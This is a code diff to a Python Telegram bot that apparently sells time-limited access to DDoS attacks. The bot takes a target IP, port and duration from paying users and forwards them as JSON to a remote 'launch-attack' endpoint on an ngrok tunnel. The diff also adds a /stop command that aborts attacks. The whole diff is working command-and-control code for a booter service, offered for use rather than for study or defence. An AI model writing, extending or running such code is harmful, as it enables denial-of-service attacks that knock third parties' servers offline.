@@ -38,7 +38,9 @@ bot.delete_message = async_delete
 
 ADMIN_IDS = {"7212246299"} # Ensure your ID is here
 
-ATTACK_API_URL = "http://YOUR_API_DOMAIN_OR_IP/api/attack?ip={ip}&port={port}&time={time}"
+# 💥 TEMPORARY NGROK TUNNELS (Update when Ngrok restarts)
+API_LAUNCH_URL = "https://hazily-math-overtone.ngrok-free.dev/launch-attack"
+API_STOP_URL = "https://hazily-math-overtone.ngrok-free.dev/stop-attack"
 DASHBOARD_URL = "https://zeromiss.netlify.app/" 
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -625,15 +627,50 @@ def execute_attack(message, target, port_str, time_str):
 
 def run_attack_api(chat_id, user_id, target, port, time_val):
     try:
-        resp = requests.get(ATTACK_API_URL.format(ip=target, port=port, time=time_val), timeout=10)
+        # Build the exact JSON payload your FastAPI expects
+        payload = {
+            "target_ip": target,
+            "target_port": str(port),
+            "time": time_val
+        }
+        
+        # Fire the POST request to your Python Brain
+        resp = requests.post(API_LAUNCH_URL, json=payload, timeout=10)
+        
         if resp.status_code == 200:
-            time.sleep(time_val)
-            bot.send_message(chat_id, f"🚀 <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱!</b> 🚀\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Duration:</b> {time_val}s", parse_mode="HTML")
-        else: bot.send_message(chat_id, f"⚠️ <b>API Error:</b> {resp.status_code}", parse_mode="HTML")
-    except: bot.send_message(chat_id, f"❌ <b>Connection Failed:</b> API Offline.", parse_mode="HTML")
+            bot.send_message(chat_id, f"🚀 <b>𝗔𝘁𝘁𝗮𝗰𝗸 𝗟𝗮𝘂𝗻𝗰𝗵𝗲𝗱 𝗼𝗻 𝗦𝗲𝗿𝘃𝗲𝗿!</b> 🚀\n🎯 <b>Target:</b> <code>{target}:{port}</code>\n⏱️ <b>Duration:</b> {time_val}s", parse_mode="HTML")
+            
+            # Keep the bot's internal sleep timer so /status works
+            time.sleep(time_val) 
+        else: 
+            bot.send_message(chat_id, f"⚠️ <b>API Error:</b> Server rejected the payload.", parse_mode="HTML")
+            
+    except Exception as e: 
+        bot.send_message(chat_id, f"❌ <b>Connection Failed:</b> API Offline.", parse_mode="HTML")
+        
     finally:
         if user_id in active_attacks: del active_attacks[user_id]
-
+            
+@bot.message_handler(commands=['stop'])
+def stop_attack_cmd(message):
+    user_id = str(message.chat.id)
+    if user_id not in allowed_user_ids or user_access.get(user_id, {}).get("expiry_time", 0) < time.time():
+        return bot.send_message(user_id, no_access_msg(), parse_mode="HTML")
+    
+    try:
+        # Fire the Abort command to the Python API
+        resp = requests.post(API_STOP_URL, json={}, timeout=10)
+        
+        if resp.status_code == 200:
+            bot.send_message(user_id, "🛑 <b>𝗔𝗧𝗧𝗔𝗖𝗞 𝗔𝗕𝗢𝗥𝗧𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!</b>", parse_mode="HTML")
+            # Remove from active attacks so /status updates instantly
+            if user_id in active_attacks:
+                del active_attacks[user_id]
+        else:
+            bot.send_message(user_id, "⚠️ <b>API Error:</b> Could not stop attack.", parse_mode="HTML")
+    except:
+        bot.send_message(user_id, "❌ <b>Connection Failed:</b> API Offline.", parse_mode="HTML")
+        
 @bot.message_handler(commands=['status'])
 def attack_status(message):
     user_id = str(message.chat.id)
